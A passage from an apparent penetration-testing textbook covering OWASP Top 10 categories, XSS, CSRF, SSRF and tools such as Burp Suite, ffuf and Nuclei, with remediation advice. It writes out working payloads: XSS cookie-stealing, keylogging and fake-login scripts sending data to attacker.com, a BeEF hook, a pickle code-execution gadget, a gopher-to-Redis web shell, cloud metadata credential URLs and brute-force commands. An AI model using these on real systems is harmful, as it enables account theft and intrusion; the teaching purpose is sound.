curl https://target.com/backup/

# Check for verbose error messages
curl "https://target.com/page?id='"        # SQL error with stack trace?
curl https://target.com/nonexistent        # Custom 404 or framework default?

# Check for exposed management interfaces
curl https://target.com/actuator           # Spring Boot
curl https://target.com/elmah.axd          # ASP.NET
curl https://target.com/server-status      # Apache
curl https://target.com/server-info        # Apache
curl https://target.com/_debug             # Various frameworks
curl https://target.com/console            # H2/Rails console
curl https://target.com/phpinfo.php        # PHP info page

# Check security headers
curl -sI https://target.com | grep -iE \
  "(strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy)"
```

**Essential security headers:**

| Header | Value | Purpose |
|:-------|:------|:--------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Enforce HTTPS |
| `Content-Security-Policy` | `default-src 'self'` | Prevent XSS, data injection |
| `X-Frame-Options` | `DENY` | Prevent clickjacking |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referer leakage |
| `Permissions-Policy` | `camera=(), microphone=()` | Restrict browser features |

{: .tip }
> Use [securityheaders.com](https://securityheaders.com) to quickly check a site's security headers. Missing headers are easy wins in a pentest report -- they demonstrate the target lacks security hardening.

**Remediation:**

- Harden all environments identically (dev, staging, production)
- Remove default accounts and sample applications
- Disable directory listing and unnecessary features
- Implement all security headers
- Automate configuration verification
- Review and update configurations regularly

---

### 9.2.6 A06: Vulnerable and Outdated Components

Applications often use libraries, frameworks, and components with known vulnerabilities.

```bash
# Identify web server and framework versions
curl -sI https://target.com | grep -iE "(server|x-powered-by|x-aspnet)"
# Server: Apache/2.4.49        <-- Known path traversal CVE
# X-Powered-By: PHP/7.4.3      <-- Check for known CVEs

# Wappalyzer (browser extension) for technology fingerprinting

# Check JavaScript libraries
curl -s https://target.com | grep -oE 'jquery[.-][0-9.]+\.js'
curl -s https://target.com | grep -oE 'angular[.-][0-9.]+\.js'
curl -s https://target.com | grep -oE 'bootstrap[.-][0-9.]+\.(js|css)'

# retire.js -- scan JavaScript for vulnerable libraries
retire --js --jspath /path/to/js/files

# npm audit -- check Node.js dependencies
npm audit
npm audit --json   # Machine-readable output

# Snyk -- comprehensive vulnerability scanning
snyk test
snyk monitor       # Continuous monitoring

# searchsploit -- search Exploit-DB offline
searchsploit apache 2.4
searchsploit jquery
searchsploit wordpress 6.0

# Check CVE databases
# https://nvd.nist.gov
# https://cve.mitre.org
# https://www.exploit-db.com
```

{: .warning }
> Many breaches start with exploiting a known vulnerability in an outdated component. The Equifax breach (2017) was caused by an unpatched Apache Struts vulnerability. Always check component versions and cross-reference with CVE databases.

**Remediation:**

- Maintain an inventory of all components and their versions
- Subscribe to security advisories for all components
- Remove unused dependencies and features
- Automate dependency scanning in CI/CD pipelines
- Prefer components with active security maintenance
- Have a patch management process with defined SLAs

---

### 9.2.7 A07: Identification and Authentication Failures

Failures in authentication allow attackers to assume other users' identities.

#### Brute Force Attacks

```bash
# Hydra -- network login brute forcer
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"

# With proxy (route through Burp)
hydra -l admin -P wordlist.txt \
      -s 443 -S target.com http-post-form \
      "/login:user=^USER^&pass=^PASS^:F=incorrect" \
      -t 4 -w 3

# Burp Intruder
# 1. Capture login request
# 2. Send to Intruder
# 3. Set payload positions on username/password
# 4. Load wordlist
# 5. Start attack
# 6. Sort by response length/status code to find successful login

# ffuf for web form brute force
ffuf -u https://target.com/login \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/wordlists/rockyou.txt \
     -fc 401
```

#### Credential Stuffing

Using credentials leaked from other breaches:

```bash
# Check for leaked credentials
# https://haveibeenpwned.com (ethical checking)

# Credential stuffing with Burp Intruder
# Payload type: Pitchfork (parallel lists)
# Payload 1: leaked_usernames.txt
# Payload 2: leaked_passwords.txt
```

#### Session Management Flaws

| Flaw | Description | Test |
|:-----|:------------|:-----|
| **Session fixation** | Attacker sets session ID before victim logs in | Check if session ID changes after login |
| **Predictable session IDs** | Session IDs follow a pattern | Collect multiple IDs, analyze for patterns |
| **Session not invalidated on logout** | Session remains valid after logout | Log out, replay old session cookie |
| **Long session timeout** | Sessions remain valid for extended periods | Check expiration time |
| **Session in URL** | `jsessionid` in URL parameters | Check for session IDs in URLs |

```bash
# Test session fixation
# 1. Get a session ID (before login)
curl -c cookies.txt https://target.com/login
cat cookies.txt   # Note session ID

# 2. Log in with that session
curl -b cookies.txt -c cookies2.txt \
     -d "username=admin&password=test" \
     https://target.com/login
cat cookies2.txt  # Session ID should CHANGE after login

# Test session invalidation on logout
# 1. Log in and capture session cookie
# 2. Log out
# 3. Try using the old session cookie
curl -b "session=old_session_value" https://target.com/dashboard
# Should return 401/302, not 200
```

#### Password Policy Weaknesses

```bash
# Test password policy
# Try registering with weak passwords:
# "password"
# "123456"
# "a"
# "" (empty)
# Same as username

# Check password reset flow
# 1. Is the reset token predictable?
# 2. Does it expire?
# 3. Is it single-use?
# 4. Can you reset other users' passwords?
# 5. Is the reset link sent over HTTP?
```

#### Multi-Factor Authentication (MFA) Bypass

| Bypass Technique | Description |
|:-----------------|:------------|
| **Direct page access** | After password, navigate directly to post-MFA page |
| **Response manipulation** | Change `"mfa_required": true` to `false` in response |
| **Code brute force** | If no rate limiting, brute-force 6-digit codes (1M combinations) |
| **Backup codes** | Try default/common backup codes |
| **Session manipulation** | Authenticate as victim, then swap session to skip MFA |
| **SIM swapping** | Social engineering the phone carrier (out of scope for web testing) |

**Remediation:**

- Implement account lockout or progressive delays
- Use strong, adaptive rate limiting
- Require MFA for sensitive operations
- Use secure session management (random IDs, proper expiry, secure flags)
- Never expose session IDs in URLs
- Hash passwords with Argon2id, bcrypt, or scrypt
- Implement proper password policies (length > complexity)

---

### 9.2.8 A08: Software and Data Integrity Failures

This category covers assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity.

#### Insecure Deserialization

Deserialization vulnerabilities occur when applications deserialize untrusted data, allowing attackers to manipulate serialized objects.

```bash
# Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# PHP deserialization
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
# Modify serialized object to escalate privileges

# Python pickle deserialization
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dumps(Exploit())

# .NET deserialization (ysoserial.net)
ysoserial.exe -g WindowsIdentity -f Json.Net -c "whoami"

# Detection: look for Base64-encoded serialized data
# Java: rO0AB (base64 of 0xACED0005)
# PHP: O: or a: prefix
# .NET: AAEAAAD (base64 header)
# Python: gASV or similar pickle headers
```

#### CI/CD Pipeline Attacks

```
# Attack vectors:
# - Compromised dependencies (supply chain attack)
# - Modified build scripts
# - Poisoned container base images
# - Secrets exposed in build logs
# - Insufficient access controls on deployment pipelines
```

#### Unsigned Updates

```
# Check if application updates are signed
# Check if application verifies update signatures
# Man-in-the-middle update mechanisms to inject malicious code
```

**Remediation:**

- Use digital signatures to verify software and data integrity
- Use tools like npm integrity checks or Sigstore for verification
- Review code and configuration changes
- Ensure CI/CD pipelines have proper access control and integrity checks
- Avoid deserializing untrusted data -- use safe formats like JSON instead

---

### 9.2.9 A09: Security Logging and Monitoring Failures

Without proper logging and monitoring, breaches go undetected.

#### What Should Be Logged

| Event | Details to Log |
|:------|:---------------|
| **Authentication** | Successful/failed logins, lockouts, MFA events |
| **Authorization** | Access denied events, privilege changes |
| **Input validation** | Injection attempts, malformed requests |
| **Application errors** | Exceptions, crashes, stack traces (sanitized) |
| **Administrative actions** | User creation, config changes, data exports |
| **Data access** | Sensitive data access, bulk downloads |

#### Log Injection

```
# If log input is not sanitized, attacker can inject fake log entries
username: admin\n[2026-02-28 12:00:00] INFO: Admin logged in successfully

# Newline injection to forge log entries
# Can cover tracks or create confusion during incident response
```

#### Monitoring Blind Spots

- No alerting on brute force attempts
- No detection of automated scanning
- No monitoring of API abuse
- Log files stored only locally (lost when server is compromised)
- No correlation between events across services

{: .note }
> During a penetration test, note what activities triggered alerts (or did not). If you performed a brute force attack, ran a vulnerability scanner, or exploited a SQLi without any defensive response, that is a significant finding to include in your report.

**Remediation:**

- Log all security-relevant events with sufficient context
- Use centralized log management (ELK Stack, Splunk, SIEM)
- Implement real-time alerting for critical events
- Protect log integrity (append-only, separate storage)
- Test detection capabilities with regular red team exercises
- Establish an incident response plan

---

### 9.2.10 A10: Server-Side Request Forgery (SSRF)

SSRF occurs when a web application fetches a remote resource based on user-supplied input without proper validation.

```
┌──────────┐    1. Request with URL     ┌──────────────┐
│ Attacker │ ─────────────────────────▶ │  Vulnerable  │
│          │                            │   Server     │
└──────────┘                            └──────┬───────┘
                                               │
                           2. Server fetches   │
                              attacker's URL   │
                                               ▼
                                        ┌──────────────┐
                                        │  Internal    │
                                        │  Service     │
                                        │  (Redis,     │
                                        │   DB, etc.)  │
                                        └──────────────┘
```

#### Internal Service Access

```bash
# Basic SSRF payloads
url=http://127.0.0.1
url=http://localhost
url=http://0.0.0.0
url=http://[::1]           # IPv6 localhost
url=http://0177.0.0.1      # Octal encoding
url=http://2130706433      # Decimal encoding of 127.0.0.1
url=http://0x7f000001      # Hex encoding

# Scan internal network
url=http://192.168.1.1
url=http://10.0.0.1
url=http://172.16.0.1

# Access internal services
url=http://127.0.0.1:8080      # Internal web app
url=http://127.0.0.1:6379      # Redis
url=http://127.0.0.1:27017     # MongoDB
url=http://127.0.0.1:9200      # Elasticsearch
url=http://127.0.0.1:5432      # PostgreSQL
url=http://127.0.0.1:3306      # MySQL
```

#### Cloud Metadata Exploitation

Most cloud providers expose instance metadata at a well-known IP address:

```bash
# AWS Instance Metadata Service (IMDSv1)
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns temporary AWS credentials (Access Key, Secret Key, Session Token)

# GCP Metadata
url=http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

# Azure Metadata
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

# DigitalOcean Metadata
url=http://169.254.169.254/metadata/v1/
```

{: .danger }
> Cloud metadata SSRF is one of the most critical web vulnerabilities in cloud environments. Stealing cloud credentials via SSRF can lead to full cloud infrastructure compromise. The 2019 Capital One breach was caused by exactly this attack vector -- an SSRF vulnerability that accessed AWS metadata and stole IAM credentials, exposing over 100 million customer records.

#### Protocol Smuggling

```bash
# File protocol
url=file:///etc/passwd
url=file:///proc/self/environ       # Environment variables
url=file:///proc/self/cmdline       # Command line

# Gopher protocol (powerful for SSRF -- craft arbitrary TCP packets)
# Redis command injection via gopher
url=gopher://127.0.0.1:6379/_SET%20shell%20%22<?php%20system($_GET['cmd']);?>%22

# Dict protocol
url=dict://127.0.0.1:6379/INFO

# TFTP protocol
url=tftp://attacker.com/file
```

#### Blind SSRF

When you cannot see the response, use out-of-band techniques:

```bash
# DNS-based detection
url=http://unique-id.burpcollaborator.net
url=http://unique-id.oast.pro
url=http://unique-id.interact.sh

# Time-based detection
url=http://10.0.0.1:22           # Open port -- fast response
url=http://10.0.0.1:12345        # Closed port -- timeout (slow response)
# Use response time differences to map internal network
```

**Remediation:**

- Validate and sanitize all user-supplied URLs
- Use allowlists for permitted domains and protocols
- Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)
- Use IMDSv2 (AWS) which requires a PUT request with a token
- Disable unnecessary URL schemes (file://, gopher://, dict://)
- Implement network segmentation
- Use a dedicated service for URL fetching with restricted network access

---

## 9.3 Cross-Site Scripting (XSS) Deep Dive

XSS is one of the most prevalent web vulnerabilities. It allows attackers to inject malicious scripts into web pages viewed by other users.

{: .note }
> XSS is technically a form of injection (A03), but it is so common and has such a unique attack surface that it deserves its own deep dive. XSS was a standalone OWASP Top 10 category until 2021 when it was merged into A03: Injection.

### 9.3.1 Reflected XSS

The malicious script is reflected off the web server in an error message, search result, or any response that includes input sent as part of the request.

```
# Attacker crafts URL:
https://target.com/search?q=<script>alert(document.cookie)</script>

# Server reflects input in response:
<p>Search results for: <script>alert(document.cookie)</script></p>

# Victim clicks the link, script executes in their browser
```

**Testing payloads:**

```html
<!-- Basic test -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- If script tags are filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>

<!-- If quotes are filtered -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>

<!-- If parentheses are filtered -->
<img src=x onerror="window.onerror=alert;throw 1">
<img src=x onerror=alert&lpar;1&rpar;>

<!-- URL-encoded -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double URL-encoded -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### 9.3.2 Stored/Persistent XSS

The malicious script is permanently stored on the target server (database, message board, comment field, etc.).

```
# Attacker posts a comment:
Great article! <script>document.location='https://attacker.com/steal?c='+document.cookie</script>

# Every user who views the comment page has their cookies stolen
```

**Common stored XSS locations:**

- Comment/review sections
- User profiles (display name, bio)
- Forum posts
- Chat messages
- File names
- Email subjects/bodies displayed in webmail
- SVG file uploads (SVG supports embedded JavaScript)

```html
<!-- SVG-based XSS (upload as image) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- Markdown-based XSS (if not properly sanitized) -->
[Click me](javascript:alert(1))
![img](x "onerror=alert(1))
```

{: .warning }
> Stored XSS is more dangerous than reflected XSS because it does not require the victim to click a crafted link. Every user who views the affected page is automatically attacked. A stored XSS in a popular page can compromise thousands of accounts.

### 9.3.3 DOM-Based XSS

The vulnerability exists in the client-side code rather than the server-side code. The malicious payload never reaches the server.

```javascript
// Vulnerable JavaScript code:
var pos = document.URL.indexOf("name=") + 5;
document.getElementById("greeting").innerHTML =
    "Hello " + document.URL.substring(pos);

// Attack URL:
// https://target.com/page#name=<img src=x onerror=alert(1)>

// Common DOM XSS sources (where attacker-controlled data enters):
document.URL
document.documentURI
document.referrer
window.location (hash, search, pathname)
window.name
document.cookie
localStorage / sessionStorage
postMessage data

// Common DOM XSS sinks (where data is executed):
innerHTML
outerHTML
document.write()
document.writeln()
eval()
setTimeout() / setInterval()
Function()
element.setAttribute("onclick", ...)
element.src = ...
jQuery.html()
jQuery.append()
```

### 9.3.4 XSS Payloads and Practical Attacks

#### Cookie Stealing

```html
<script>
new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
</script>

<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>
```

#### Session Hijacking

```html
<script>
// Steal session and redirect to attacker-controlled page
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/steal?session=' + document.cookie, true);
xhr.send();
</script>
```

#### Keylogging

```html
<script>
document.onkeypress = function(e) {
    new Image().src = "https://attacker.com/log?key=" + e.key;
};
</script>
```

#### Phishing via XSS

```html
<script>
document.body.innerHTML = '<h1>Session Expired</h1>' +
    '<form action="https://attacker.com/phish" method="POST">' +
    '<input name="username" placeholder="Username">' +
    '<input name="password" type="password" placeholder="Password">' +
    '<button type="submit">Log In</button></form>';
</script>
```

#### Port Scanning via XSS

```html
<script>
// Scan internal network from victim's browser
for (var i = 1; i < 255; i++) {
    var img = new Image();
    img.src = "http://192.168.1." + i + ":80";
    img.onload = function() {
        fetch("https://attacker.com/found?ip=" + this.src);
    };
}
</script>
```

### 9.3.5 BeEF (Browser Exploitation Framework)

BeEF hooks a victim's browser and provides an interactive control panel for further exploitation.

```bash
# Start BeEF
cd /usr/share/beef-xss
./beef

# Default credentials: beef / beef
# Hook URL: http://attacker-ip:3000/hook.js
# Control panel: http://attacker-ip:3000/ui/panel

# XSS payload to hook a browser:
<script src="http://attacker-ip:3000/hook.js"></script>
```

**BeEF capabilities once a browser is hooked:**

| Category | Capabilities |
|:---------|:-------------|
| **Information Gathering** | Browser details, installed plugins, visited URLs, network discovery |
| **Social Engineering** | Fake login prompts, fake update notifications, clipboard theft |
| **Network** | Port scanning, network fingerprinting, internal network mapping |
| **Persistence** | Man-in-the-browser, pop-under windows, iFrame injection |
| **Exploitation** | Exploit browser vulnerabilities, launch Metasploit modules |

### 9.3.6 XSS Filter Evasion

When basic payloads are blocked by WAFs or input filters:

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- HTML encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Unicode encoding -->
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>

<!-- Tab, newline, carriage return inside tags -->
<img src=x onerror="a]lert(1)">
<img src=x onerror="ale
rt(1)">

<!-- SVG with encoded payload -->
<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script></svg>

<!-- JavaScript protocol in href -->
<a href="javascript:alert(1)">Click</a>
<a href="JaVaScRiPt:alert(1)">Click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">Click</a>

<!-- Event handlers with encoding -->
<div onmouseover="alert(1)">hover me</div>
<input type="text" value="" onfocus="alert(1)" autofocus>

<!-- Template literals (ES6) -->
<script>alert`1`</script>

<!-- Constructor approach -->
<script>[].constructor.constructor('alert(1)')()</script>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Using data: protocol -->
<object data="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
```

{: .tip }
> The PortSwigger XSS cheat sheet (portswigger.net/web-security/cross-site-scripting/cheat-sheet) is the most comprehensive reference for XSS payloads. It is regularly updated and organized by tag, event, and browser support.

**XSS Remediation:**

- **Output encoding** -- Encode output based on context (HTML, JavaScript, URL, CSS)
- **Content Security Policy** -- Restrict script sources with CSP headers
- **Input validation** -- Allowlist expected characters
- **Use safe APIs** -- `textContent` instead of `innerHTML`, parameterized DOM manipulation
- **HTTPOnly cookies** -- Prevent cookie theft via XSS
- **Use modern frameworks** -- React, Vue, Angular auto-escape by default (but watch for `dangerouslySetInnerHTML`)

---

## 9.4 Cross-Site Request Forgery (CSRF)

CSRF forces a logged-in user to submit an unwanted request to a web application they are currently authenticated with.

### 9.4.1 How CSRF Works

```
1. Victim is logged into bank.com (has valid session cookie)
2. Victim visits evil.com (attacker's site)
3. evil.com contains hidden form that submits to bank.com:

<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

4. Victim's browser automatically includes bank.com cookies
5. bank.com processes the transfer as if the victim initiated it
```

**CSRF can also work with GET requests:**

```html
<!-- Image tag triggers GET request -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Or via link -->
<a href="https://bank.com/transfer?to=attacker&amount=10000">
    Click for free prize!
</a>
```

### 9.4.2 Testing for CSRF

```
Step 1: Identify state-changing operations
- Password change
- Email change
- Fund transfer
- Profile update
- Account deletion
- Admin actions

Step 2: Check for CSRF protections
- Look for CSRF tokens in forms (hidden fields)
- Check for custom headers (X-CSRF-Token)
- Check SameSite cookie attribute
- Check Referer/Origin header validation

Step 3: Attempt bypass
```

**CSRF protection bypass techniques:**

| Protection | Bypass Technique |
|:-----------|:-----------------|
| CSRF token in form | Check if token is validated server-side, try removing it |
| Token tied to session | Check if any valid token works (token not per-session) |
| Token in cookie + form | Check if you can set the cookie via subdomain |
| Referer validation | Try empty referer: `<meta name="referrer" content="no-referrer">` |
| Referer regex | `https://target.com.evil.com` or `https://evil.com/target.com` |
| SameSite=Lax | Works for top-level GET requests; check for GET-based state changes |
| JSON Content-Type | Try form submission with enctype that produces valid JSON |

```html
<!-- CSRF PoC generator (basic) -->
<html>
<body>
<h1>CSRF Proof of Concept</h1>
<form action="https://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Submit">
</form>
<script>
    // Auto-submit
    document.forms[0].submit();
</script>
</body>
</html>
```

{: .tip }
> Burp Suite Professional can automatically generate CSRF PoC HTML. Right-click any request in Burp and select "Engagement tools" then "Generate CSRF PoC." This saves significant time during testing.

### 9.4.3 CSRF Remediation

- **Synchronizer Token Pattern** -- Include a unique, unpredictable token in each form
- **Double Submit Cookie** -- Send token in both cookie and request parameter
- **SameSite Cookies** -- Set `SameSite=Strict` or `SameSite=Lax`
- **Custom Request Headers** -- Require a custom header (e.g., `X-Requested-With`) that cannot be sent cross-origin
- **Verify Origin/Referer headers** -- As defense-in-depth, not primary protection
- **Re-authentication for sensitive actions** -- Require password confirmation for critical operations

---

## 9.5 Burp Suite

Burp Suite is the industry-standard web application security testing platform. Burp Suite Community Edition is free; Professional Edition adds the scanner, advanced Intruder, and more.

### 9.5.1 Proxy Setup and Browser Configuration

```
Step 1: Launch Burp Suite
         Proxy → Options → Proxy Listeners
         Default: 127.0.0.1:8080

Step 2: Configure browser proxy
         Option A: FoxyProxy browser extension (recommended)
                   Add proxy: 127.0.0.1:8080
         Option B: System proxy settings
         Option C: Burp's embedded Chromium browser

Step 3: Install Burp CA certificate
         Navigate to http://burp in proxied browser
         Download CA certificate
         Import into browser/OS trust store
         (Required for intercepting HTTPS traffic)

Step 4: Configure scope
         Target → Scope → Add target domain
         This filters noise and focuses on your target
```

{: .note }
> Always configure scope before testing. Without scope, Burp captures traffic from every domain your browser contacts, creating massive amounts of noise. Right-click a target in the Site Map and select "Add to scope," then set the proxy to only intercept in-scope traffic.

### 9.5.2 Intercepting and Modifying Requests

```
Proxy → Intercept tab:
- Toggle "Intercept is on/off"
- When ON: every request pauses for you to review/modify
- Modify any part: URL, headers, body, cookies
- Forward: send modified request
- Drop: discard the request
- Action: send to Repeater, Intruder, Scanner, etc.

Key workflow:
1. Browse the application with intercept OFF (build site map)
2. Turn intercept ON for specific actions
3. Modify parameters, headers, cookies
4. Forward and observe the response
```

### 9.5.3 Key Burp Tools

#### Repeater

Manual request manipulation and resending:

```
Usage:
1. Right-click any request → "Send to Repeater"
2. Modify the request (parameters, headers, body)
3. Click "Send"
4. Analyze the response
5. Iterate until you find/exploit the vulnerability

Best for:
- Manual SQLi testing
- Testing access control (change IDs, tokens)
- Testing business logic
- Verifying findings from automated scans
```

#### Intruder

Automated, customizable attacks:

```
Attack Types:
- Sniper: Single payload position, one payload at a time
- Battering Ram: Same payload in all positions simultaneously
- Pitchfork: Multiple payload sets, one per position (parallel)
- Cluster Bomb: All combinations of multiple payload sets

Workflow:
1. Send request to Intruder
2. Mark injection points with § symbols
3. Select attack type
4. Configure payloads (wordlists, numbers, etc.)
5. Start attack
6. Sort results by status code, length, or response time

Common uses:
- Brute-force login credentials
- Enumerate valid usernames
- Fuzz parameters for injection
- Test IDOR by iterating IDs
```

#### Scanner (Professional Only)

```
Passive scanning: Analyzes proxied traffic for vulnerabilities
                  (no additional requests sent)

Active scanning: Actively probes targets for vulnerabilities
                 (sends additional requests with payloads)

Usage:
1. Right-click target in Site Map → "Actively scan this host"
2. Or right-click individual requests → "Do an active scan"
3. Review findings in Target → Issues tab
4. Verify each finding manually (false positives are common)
```

#### Decoder

```
Encode/decode data in various formats:
- URL encoding/decoding
- HTML encoding/decoding
- Base64 encoding/decoding
- Hex encoding/decoding
- Binary
- Gzip
- Hash functions (MD5, SHA-1, SHA-256)

Usage: Paste data → select transform → view result
Can chain multiple transforms
```

#### Comparer

```
Compare two items side by side:
- Compare requests to find what changed
- Compare responses to identify differences
- Word-level or byte-level comparison
- Useful for identifying subtle differences in blind attacks
```

### 9.5.4 Essential Burp Extensions

| Extension | Purpose |
|:----------|:--------|
| **Active Scan++** | Enhanced active scanning with additional checks |
| **Logger++** | Advanced logging with search and filter |
| **Autorize** | Automated authorization testing (IDOR, privilege escalation) |
| **Turbo Intruder** | High-speed Intruder alternative (Python scripting) |
| **JSON Web Tokens** | Decode, modify, and attack JWTs |
| **Param Miner** | Find hidden parameters |
| **Upload Scanner** | Test file upload functionality |
| **Retire.js** | Identify vulnerable JavaScript libraries |
| **Hackvertor** | Advanced encoding/decoding with tag-based transforms |
| **InQL** | GraphQL security testing |

```
Installing extensions:
Extender → BApp Store → Search → Install

Or install manually:
Extender → Extensions → Add → Select .jar file
```

### 9.5.5 Practical Burp Workflow

```
Phase 1: Reconnaissance
1. Configure scope with target domains
2. Browse the entire application with Burp proxying (intercept OFF)
3. Review Site Map for complete coverage
4. Note interesting endpoints, parameters, hidden fields

Phase 2: Passive Analysis
5. Review passively identified issues
6. Check for information disclosure (comments, version numbers)
7. Analyze cookies and session handling
8. Map authentication and authorization flows

Phase 3: Active Testing
9. Send critical requests to Repeater for manual testing
10. Use Intruder for brute-force and fuzzing
11. Run Scanner (Professional) on key endpoints
12. Use Autorize for access control testing

Phase 4: Exploitation
13. Build proof-of-concept for each finding
14. Document reproduction steps
15. Capture screenshots and request/response pairs
16. Assess business impact of each vulnerability
```

---

## 9.6 Other Web Security Tools

### 9.6.1 OWASP ZAP

OWASP ZAP (Zed Attack Proxy) is a free, open-source alternative to Burp Suite:

```bash
# Launch ZAP
zaproxy

# Command-line scanning
zap-cli quick-scan https://target.com
zap-cli active-scan https://target.com
zap-cli report -o report.html -f html

# ZAP as a proxy (default port 8080)
# Configure browser proxy to 127.0.0.1:8080

# Automated scan via API
zap-api-scan.py -t https://target.com/openapi.json -f openapi

# Docker-based scan
docker run -t owasp/zap2docker-stable zap-full-scan.py \
       -t https://target.com
```

**ZAP vs Burp Suite:**

| Feature | ZAP | Burp Free | Burp Pro |
|:--------|:----|:----------|:---------|
| Price | Free | Free | ~$449/yr |
| Active scanner | Yes | No | Yes |
| Intruder (throttled) | N/A | Yes (throttled) | Full speed |
| Extensions | Yes | Yes | Yes |
| Automation | Strong API | Limited | Good |
| CI/CD integration | Native | Limited | Plugin |

### 9.6.2 Wfuzz

Web fuzzer for finding resources and testing parameters:

```bash
# Directory/file discovery
wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
      --hc 404 https://target.com/FUZZ

# Parameter fuzzing
wfuzz -c -w /usr/share/wordlists/params.txt \
      --hc 404 "https://target.com/page?FUZZ=test"

# Value fuzzing
wfuzz -c -w /usr/share/wordlists/sqli.txt \
      "https://target.com/page?id=FUZZ"

# POST data fuzzing
wfuzz -c -w wordlist.txt -d "username=admin&password=FUZZ" \
      --hc 401 https://target.com/login

# Multiple payloads
wfuzz -c -w users.txt -w passwords.txt \
      -d "username=FUZZ&password=FUZ2Z" \
      --hc 401 https://target.com/login

# Filter by response size, words, lines
wfuzz -c -w wordlist.txt --hl 0 https://target.com/FUZZ  # Hide 0-line responses
wfuzz -c -w wordlist.txt --hw 12 https://target.com/FUZZ # Hide 12-word responses
wfuzz -c -w wordlist.txt --hh 1234 https://target.com/FUZZ # Hide specific size
```

### 9.6.3 ffuf (Fuzz Faster U Fool)

Modern, fast web fuzzer written in Go:

```bash
# Directory enumeration
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# File extension fuzzing
ffuf -u https://target.com/admin.FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# Subdomain enumeration (virtual hosts)
ffuf -u https://target.com -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 1234    # Filter by size to remove false positives

# POST parameter fuzzing
ffuf -u https://target.com/login \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/wordlists/rockyou.txt \
     -fc 401

# Recursive directory discovery
ffuf -u https://target.com/FUZZ -w wordlist.txt \
     -recursion -recursion-depth 3

# Rate limiting (requests per second)
ffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100

# Multiple wordlists (cluster bomb style)
ffuf -u https://target.com/FUZZ1/FUZZ2 \
     -w wordlist1.txt:FUZZ1 \
     -w wordlist2.txt:FUZZ2 \
     -mode clusterbomb

# Output to file
ffuf -u https://target.com/FUZZ -w wordlist.txt \
     -o results.json -of json
```

{: .tip }
> ffuf is significantly faster than wfuzz and gobuster for most fuzzing tasks. It supports multiple output formats, recursive scanning, and advanced filtering. Use `-mc all -fc 404` to show all status codes except 404 for the broadest coverage.

### 9.6.4 Nuclei

Template-based vulnerability scanner:

```bash
# Update templates
nuclei -ut

# Basic scan with all templates
nuclei -u https://target.com

# Scan with specific template tags
nuclei -u https://target.com -tags cve,rce,sqli

# Scan with severity filter
nuclei -u https://target.com -severity critical,high

# Scan multiple targets from file
nuclei -l targets.txt -severity critical

# Specific template
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

# Output to file
nuclei -u https://target.com -o results.txt

# Rate limiting
nuclei -u https://target.com -rl 100   # 100 requests per second

# Headless browser templates (for DOM-based vulns)
nuclei -u https://target.com -headless

# Custom templates directory
nuclei -u https://target.com -t ~/custom-templates/
```

**Nuclei template categories:**

| Category | Description |
|:---------|:------------|
| `cves/` | Known CVE exploits |
| `vulnerabilities/` | Generic vulnerability checks |
| `misconfiguration/` | Security misconfigurations |
| `exposures/` | Information disclosure |
| `default-logins/` | Default credential checks |
| `takeovers/` | Subdomain takeover checks |
| `technologies/` | Technology detection |

### 9.6.5 Curl for Manual Testing

